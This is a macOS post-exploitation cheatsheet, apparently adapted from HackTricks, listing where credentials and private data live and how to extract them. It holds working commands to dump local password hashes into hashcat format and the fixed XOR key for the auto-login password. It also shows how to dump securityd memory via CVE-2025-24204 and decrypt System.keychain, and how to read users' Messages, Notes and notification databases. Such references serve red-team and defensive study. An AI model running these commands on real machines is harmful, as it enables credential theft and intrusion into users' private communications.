---
title: "macOS Loot: Sensitive Files, Credential Stores, Interesting DBs"
type: cheatsheet
tags: [macos, post-exploitation, credentials, loot, cheatsheet]
phase: post-exploitation
sources: [hacktricks-macos]
---

# macOS Loot: Sensitive Files, Credential Stores, Interesting DBs

Post-exploitation loot map beyond the keychain (see [[macos-keychain]] for keychain internals). Pair with [[macos-enumeration]] for the surrounding host recon.

## Local password hashes

Local password hashes live in per-user plists under `/var/db/dslocal/nodes/Default/users/` as `ShadowHashData` (SALTED-SHA512-PBKDF2, hashcat `-m 7100`):

```bash
sudo dscl . -read /Users/$(whoami) ShadowHashData
# dump all non-service accounts to hashcat -m 7100 format:
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in iterations salt entropy; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

## Auto-login password

`/etc/kcpassword`, XORed with the fixed key `7D 89 52 23 D2 BC DD EA A3 B9 1F` (key reused if the password is longer). Trivially recoverable when automatic login is on.

## Keychain via securityd memory

`SystemKey` decrypts `System.keychain`. On unpatched Sequoia 15.0-15.2, `/usr/bin/gcore` shipped with `com.apple.system-task-ports.read`, so any admin could dump any process (SIP/TCC notwithstanding) and lift the Keychain master key (CVE-2025-24204), then feed it to Chainbreaker:

```bash
sudo gcore -o /tmp/sec $(pgrep securityd)     # dump securityd (vuln builds only)
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey  # SystemKey to decrypt System.keychain
python2.7 chainbreaker.py --dump-all --key <hex> /Library/Keychains/System.keychain
```

## Message / note / notification content

```bash
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables  # ZICNOTEDATA.ZDATA = gzip protobuf
# Notification Center: legacy $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db
# Sequoia+ (TCC-protected): ~/Library/Group Containers/group.com.apple.usernoted/db2/db
# CVE-2024-44292/44293/40838/54504: any local user could read banner text on 14.7-15.1
```

## Persistence / login-item enumeration

`sfltool dumpbtm` and the BTM stores:

- `~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`
- `/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v*.btm`

SIP-protected `/System/Library/OpenDirectory/permissions.plist` maps which UUIDs may read `ShadowHashData` / `KerberosKeys`.

## Sources

- HackTricks (macos-hardening).
